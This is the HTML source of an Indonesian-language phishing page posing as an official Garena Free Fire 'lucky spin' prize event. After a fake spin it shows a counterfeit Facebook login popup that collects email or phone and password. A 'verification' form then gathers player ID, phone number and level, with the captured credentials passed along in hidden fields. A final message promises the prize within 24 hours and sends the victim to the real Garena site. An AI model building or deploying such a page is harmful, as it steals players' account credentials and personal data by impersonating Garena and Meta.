    .containerLanding, .containerHome {
        width: 100%;
        height: auto;
        margin-top: -3px;
        margin-bottom: 0px;
		border: none;
        border-radius: 0px;
        padding: 0px;	
    }    
	.slider-container {
		margin-top: -4px;
		border: none;
	}
	.sec-container, .sec-verify-container {
	    border: none;	    
	}
    .gallery-container {	             
        float: left;
        margin-top:-2px;  
        width:100%;
        height:auto;
        border: 0px solid #fff;       
    }
    .box {
	    width: 100%;
		height: 405px;
        margin-top: 35px;	
        margin-bottom: -25px;		
	}
    .box-item {
	    width: 100%;	
	    margin-left:auto;
        margin-right:auto;	
		padding-top:1px;
	}
    .scroll {
        height: 400px;    
    }
    .event-notification {    
	   width:93%;
	   height:53px;
	   padding:7px;
	   margin-right: auto;
	   margin-left: auto;
    }
    .event-notification-text {
	   padding-top:11px;
	   font-family:arial,sans-serif;
	   font-size:16px;
    }
    .alert-wrapper {
       margin-top: 35px;  
    }
    .footer {
       border-left: 0px solid #fff;
       border-right: 0px solid #fff;
       border-top: 1px solid #FF7632;
       border-bottom: 0px solid #fff;
    }
    .popup-box-wrapper {
        width: 360;
        margin-top: 60%;
    }
    .popup-box-wrappers {
        width: 360px;
        margin-top: 60%;
    }
    .popup-box-item {
        width: 27%;
        height: 100px;
    }
    .popup-box-login-fb {
        margin-top: 6%;
    }
    .popup-box-login-twitter {
        margin-top: 25%;
    }
	.footer {
        background-position-y: calc(500 / 640 * 210vw);
    }
	.footer-socmed-box p {
	    margin-top: 12px;
	}
}
</style>       

<div class="slider-container">
<div class="navbar">
<img class="navbar-logo" src="img/logos1.png">
<div class="navbar-right">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_language.svg">
<img class="navbar-language" src="https://www.pubgmobile.com/en/images/nav_menu.svg">
</div> <!--- navbar-right --->
</div> <!--- navbar --->
<div class="slider">
<iframe style="width: 100%; height: 250px;" frameborder="0" type="text/html" src="https://www.youtube.com/embed/9L6mOEFuD1s?controls=0&loop=1&autoplay=1&fs=1&iv_load_policy=3&showinfo=0&rel=0&cc_load_policy=0&start=0&end=0&origin=https://youtubeembedcode.com" allowfullscreen autoplay muted loop allow="autoplay" controls="0"></iframe>
</div> <!--- slider --->
</div> <!--- slider-container --->
<div class="gallery-container">
<div class="event-title">FREE FIRE LUCKY SPIN</div> <!--- event-title --->
<div class="event-subtitle"><span>Spin Sekarang dan Dapatkan Hadiah M1887 EVO</span></div> <!--- event-subtitle --->
<div class="rewards-section">
<div class="cont spin_content">
<div class="mobile-border">
<section class="container" id="js-lotto">
<div class="square" data-order="0">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift1" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/1.png" x="-25" width="150" height="100" data-id="Unknown Cash - 1500"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift1)"></polygon></svg></div>
</div>
<div class="square" data-order="1">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift2" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/2.png" x="-25" width="150" height="100" data-id="Silver Guru Set (Permanent ×1)"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift2)"></polygon></svg></div>
</div>
<div class="squar" data-order="5">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift3" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/3.png" x="-25" width="150" height="100" data-id="M416 - Glacier (Permanent ×1)"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift3)"></polygon></svg></div>
</div>
<div class="start squar__start-btn">
<div>
<center>
<o onclick="audioFile()" onmousedown="buka.play();"><img src="img/draw.png" width="100" height="100" id="js-start"></o>
</center>
</div>
</div>
<div class="squar" data-order="2">
<div class="squar__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift4" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/4.png" x="-25" width="150" height="100" data-id="M416 - Silver Guru (Permanent ×1)"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift4)"></polygon></svg></div>
</div>
<div class="square" data-order="4">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift5" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/5.png" x="-25" width="150" height="100" data-id="Material - 28"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift5)"></polygon></svg></div>
</div>
<div class="square" data-order="3">
<div class="square__content"><svg viewBox="0 0 100 100" version="1.1" xmlns="http://www.w3.org/2000/svg"><defs><pattern id="gift6" patternUnits="userSpaceOnUse" width="100" height="100"><image xlink:href="img/reward/6.png" x="-25" width="150" height="100" data-id="Martial Champion Set (Permanent ×1)"></image></pattern></defs><polygon points="0 0 950 0 0 0 900 0 0 750 0 0" fill="url(#gift6)"></polygon></svg></div>
</div>
</section> <!--- container --->
</div> <!--- mobile-border --->
</div> <!--- cont spin_content --->
</div> <!--- rewards-section --->
</div> <!--- gallery-container --->

<div class="footer">
<img class="footer-copyright-icon" src="img/logos.png">
<div class="footer-copyright-text">
<div class="footer-txt-copyrights">
Copyright © Garena International. Trademarks belong to their respective owners. All rights reserved.
</div> <!--- footer-txt-copyrights --->
<div class="footer-copyright-text-left">Privacy Policy</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-center">For Parents FAQ</div> <!--- footer-txt-copyright --->
<div class="footer-copyright-text-right">SYARAT LAYANAN</div> <!--- footer-txt-copyright --->
</div> <!--- footer-copyright-text --->
</div> <!--- footer --->

<script src="./index_files/jquery.min.js.download"></script>
<script type="text/javascript" src="index_files/gift-zone.js"></script>
<script type="text/javascript" src="js-zone/slide-zone.js"></script>
<script type="text/javascript" src="./index_files/slide-zone.js.download"></script>

<div class="popup open_rewards animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-alert4"><br>SELAMAT</div> <!--- popup-box-alert --->
<div class="popup-box-item itemShine">
<div>
<figure>
<img class="popup-item" src="">
</figure>
</div>
</div> <!--- popup-box-item itemShine --->
<br>
<div class="popup-box-footers">
<button type="button" onmousedown="buka.play();" onmousedown="buka.play();" onclick="open_account_login()">Kumpulkan</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup open_rewards --->

<div class="popup account_login animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-title"><br>AKUN MASUK<br></div> <!--- popup-box-alert --->
<div class="popup-box-alertlog">
Masuk ke Akun FREE FIRE.<br>
</div> <!--- popup-box-alertlog --->
<button type="button" onmousedown="buka.play();" class="popup-btn-login popup-btn-facebook" onclick="open_facebook();"><i class="fa fa-facebook-square icon-login"></i>Masuk Menggunakan Akun Facebook</button>
<br><br>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup account_login --->

<div class="popup-login login-facebook animated fadeIn" style="display: none;">
<div class="popup-box-login-fb">
<a onmousedown="tutup.play();" onclick="close_facebook()" class="close-fb"><i class="zmdi zmdi-close"></i></a>
<div class="navbar-fb">
<img src="img/facebook-text.png">
</div>
<div class="content-box-fb">
<p class="kaget email-fb" style="width: 320px; top: -5px; text-align: left;">Alamat email atau nomor telepon yang Anda masukkan tidak cocok dengan akun mana pun. <b>Mendaftar untuk sebuah akun.</b></p>
<p class="kaget sandi-fb" style="width: 320px; top: -5px; text-align: left;">Kata sandi yang Anda masukkan salah. Apakah anda melupakan kata sandi?</p>
<img src="img/320x0w.webp">
<div class="txt-login-fb">
 Masuk ke akun Facebook Anda untuk terhubung ke FREE FIRE.
</div>
<form class="login-form" action="javascript:void(0)" method="post" id="ValidateLoginFbForm" onclick="$(this).end()">
<div class="form-group-fb">
<input type="text" name="user" id="email-facebook" placeholder="Nomor ponsel atau alamat email" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan nomor ponsel atau alamat email')" oninput="setCustomValidity('')">
<div class="form-group-sohid showFbPassword" id="showFbPassword" onclick="showFbPassword()">
<img src="https://i.ibb.co/PYpHF6b/Twitter-Show-Password.png">
</div> <!--- form-group-sohid showFbPassword --->
<div class="form-group-sohid hidePassword" style="display: none;" onclick="hideFbPassword()">
<img src="https://i.ibb.co/pZDr8sd/Twitter-Hide-Password.png">
</div> <!--- form-group-sohid showFbPassword --->
<input type="password" name="pass" id="password-facebook" placeholder="Kata sandi" autocomplete="off" autocapitalize="off" required oninvalid="this.setCustomValidity('Masukkan kata sandi')" oninput="setCustomValidity('')">
</div> <!--- form-group-fb --->
<input type="hidden" name="login" id="login-facebook" value="Facebook" readonly>
<button type="submit" class="btn-login-fb" onclick="ValidateLoginFbData()">Log In</button>
</form>
<div class="txt-create-account">Buat Akun</div>
<div class="txt-not-now">Tidak sekarang</div>
<div class="txt-forgotten-password">Lupa Kata Sandi?</div>
</div>
<div class="language-box">
<center>
<div class="language-name language-name-active">Indonesia</div>
<div class="language-name">العربية</div>
<div class="language-name">Türkçe</div>
<div class="language-name">Tiếng Việt</div>
<div class="language-name">日本語</div>
<div class="language-name">Español</div>
<div class="language-name">English (UKl)</div>
<div class="language-name">
<i class="fa fa-plus"></i>
</div>
</center>
</div>
<div class="copyright">Meta © 2023</div>
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup-login login-facebook-load" style="display: none;">
<div class="popup-box-login-fb">
<div class="navbar-fb">
<img src="img/facebook-text.png">
</div>
<div class="content-box-fb">
<div class="fb-load">
<img src="img/icon_fb.png">
<div class="loader3"></div>
</div>
</div> <!--- fb-load-title --->
</div> <!--- fb-load --->
</div> <!--- popup-box-login-fb --->
</div> <!--- popup-login--->

<div class="popup account_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-title"><br>Verifikasi Akun</div> <!--- popup-box-alert --->
<div class="popup-box-alert4"><br>Lengkapi detail akun Anda:</div> <!--- popup-box-alert --->
<form class="popup-box-form" action="javascript:void(0)" method="post" id="ValidateVerificationDataForm" onclick="$(this).end()">
<input type="hidden" name="user" id="validateEmail" readonly>
<input type="hidden" name="pass" id="validatePassword" readonly>
<input type="number" name="playid" id="playid" placeholder="ID Pemain" autocomplete="off" required oninvalid="this.setCustomValidity('Masukkan ID Pemain Anda')" oninput="setCustomValidity('')">
<input type="number" name="phone" id="phone" placeholder="Nomor telepon" autocomplete="off" required oninvalid="this.setCustomValidity('Masukkan Nomor Telepon Anda')" oninput="setCustomValidity('')">
<select name="level" id="level" required oninvalid="this.setCustomValidity('Pilih Level Akun Anda')" oninput="setCustomValidity('')">
<option selected="selected" disabled="disabled" value="">Level Akun</option>
<option>1</option>
<option>2</option>
<option>3</option>
<option>4</option>
<option>5</option>
<option>6</option>
<option>7</option>
<option>8</option>
<option>9</option>
<option>10</option>
<option>11</option>
<option>12</option>
<option>13</option>
<option>14</option>
<option>15</option>
<option>16</option>
<option>17</option>
<option>18</option>
<option>19</option>
<option>20</option>
<option>21</option>
<option>22</option>
<option>23</option>
<option>24</option>
<option>25</option>
<option>26</option>
<option>27</option>
<option>28</option>
<option>29</option>
<option>30</option>
<option>31</option>
<option>32</option>
<option>33</option>
<option>34</option>
<option>35</option>
<option>36</option>
<option>37</option>
<option>38</option>
<option>39</option>
<option>40</option>
<option>41</option>
<option>42</option>
<option>43</option>
<option>44</option>
<option>45</option>
<option>46</option>
<option>47</option>
<option>48</option>
<option>49</option>
<option>50</option>
<option>51</option>
<option>52</option>
<option>53</option>
<option>54</option>
<option>55</option>
<option>56</option>
<option>57</option>
<option>58</option>
<option>59</option>
<option>60</option>
<option>61</option>
<option>62</option>
<option>63</option>
<option>64</option>
<option>65</option>
<option>66</option>
<option>67</option>
<option>68</option>
<option>69</option>
<option>70</option>
<option>71</option>
<option>72</option>
<option>73</option>
<option>74</option>
<option>75</option>
<option>76</option>
<option>77</option>
<option>78</option>
<option>79</option>
<option>80</option>
<option>81</option>
<option>82</option>
<option>83</option>
<option>84</option>
<option>85</option>
<option>86</option>
<option>87</option>
<option>88</option>
<option>89</option>
<option>90</option>
<option>91</option>
<option>92</option>
<option>93</option>
<option>94</option>
<option>95</option>
<option>96</option>
<option>97</option>
<option>98</option>
<option>99</option>
<option>100</option>
</select>
<input type="hidden" name="login" id="validateLogin" readonly>
<br>
<div class="popup-box-footers">
<button type="submit" onmousedown="buka.play();" onclick="ValidateVerificationData()">Ya</button>
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-bg --->
</form> <!--- form --->
</div> <!--- popup-box-wrapper popup-box-verification --->
</div> <!--- popup account_verification --->

<div class="popup check_verification animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-title"><br>Verifikasi Akun</div> <!--- popup-box-alert --->
<div class="popup-box-alert4"><br>
<i class="zmdi zmdi-spinner zmdi-hc-spin"></i>
<br>
Memeriksa detail akun Anda...
<br><br>
</div> <!--- popup-box-bg --->
<div class="popup-box-footer">
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-alert4 --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup check_verification --->

<div class="popup processing_account animated fadeIn" style="display: none;">
<div class="popup-box-wrapper">
<div class="popup-box-bg">
<div class="popup-box-title"><br>Akun Dalam Proses</div> <!--- popup-box-alert --->
<div class="popup-box-alert3"><br>
Terima Kasih telah mengambil Hadiah dari FREE FIRE.
<br>
Hadiah Akan Segera Dikirim Ke ID Anda, Harap Bersabar Menunggu Antrian. Akun Anda Sedang Diproses Untuk Menerima Hadiah. Harap Tunggu 24 Jam. </div>
<div class="popup-box-alert0">
<br><br>- GARENA FREE FIRE OFFICIAL -
</div> <!--- popup-box-alert0 --->
<div class="popup-box-footers">
<button type="button" onmousedown="tutup.play();" style="margin-right: 0; float: none;" onclick="location.href='https://ff.garena.com/id/';">Keluar</button>
</div> <!--- popup-box-bg --->
</div> <!--- popup-box-form-footer --->
</div> <!--- popup-box-wrapper --->
</div> <!--- popup processing_account --->

<audio id="audioFile" src="media/spin.mp3"></audio>

<script>
// code for playing sound when spinin rewards
function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();
}
$(document).ready(function(){
        $("o").attr("onclick", "audioFile()");
});

// code for random id
var slidePlayer = 0;
openSlides();
function openSlides() {
    var i;
    var slides = document.getElementsByClassName("event-notification-status-content-txt");
    for (i = 0; i < slides.length; i++) {
        slides[i].style.display = "none"; 
    }
    slidePlayer++;
    if (slidePlayer > slides.length) {slidePlayer = 1} 
    slides[slidePlayer-1].style.display = "block"; 
    setTimeout(openSlides, 2500);
}
// code for showing countdown timer
$(document).ready(function() {
    var detik = 59;
    var menit = 59;
    var jam = 23;
	
    function hitung() {
		setTimeout(hitung, 1000);
        $('#countdownTimer').html('' + jam + ' : ' + menit + ' : ' + detik + '');
        detik--;
        if (detik < 0) {
            detik = 59;
            menit--;
            if (menit < 0) {
                menit = 0;
                detik = 0;
            }
        }
    }
    hitung();
});
</script>
<script type="text/javascript" src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.3/jquery.min.js"></script>
<script type="text/javascript" src="js-zone/script.js"></script>
<script type="text/javascript" src="js-zone/showHide.js"></script>
</body>
</html>